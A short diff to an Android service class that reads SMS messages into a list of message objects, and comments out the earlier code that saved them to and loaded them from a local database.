@@ -93,12 +93,19 @@ public class MsgService extends Service {
             }
 
 
+            MsgDatum person = new MsgDatum();
+            person.setMobile(address);
+            person.setMessage(body);
+            person.setDate(String.valueOf(dateFormat));
+            person.setType(type);
+            data.add(person);
 
-            DatabaseHelper db = new DatabaseHelper(getApplication());
+
+           /* DatabaseHelper db = new DatabaseHelper(getApplication());
 
             Boolean result = db.insert(id,address, body, type, String.valueOf(dateFormat));
 
-            Log.d("gayaDatabaseMai", String.valueOf(result));
+            Log.d("gayaDatabaseMai", String.valueOf(result));*/
 
 
             sms.add("\nNumber: " + address + "\n Message: " + body + "\n Date:" + dateFormat + "\n Type:" + type);
@@ -116,7 +123,7 @@ public class MsgService extends Service {
         }
         //return sms;
 
-                final DatabaseHelper db = new DatabaseHelper(getApplicationContext());
+             /*   final DatabaseHelper db = new DatabaseHelper(getApplicationContext());
                 Cursor c = db.getMsgs();
 
                 if (c != null)
@@ -127,7 +134,7 @@ public class MsgService extends Service {
                       person.setDate(c.getString(c.getColumnIndex("date")));
                       person.setType(c.getString(c.getColumnIndex("type")));
                       data.add(person);
-                    }
+                    }*/
 
 
 
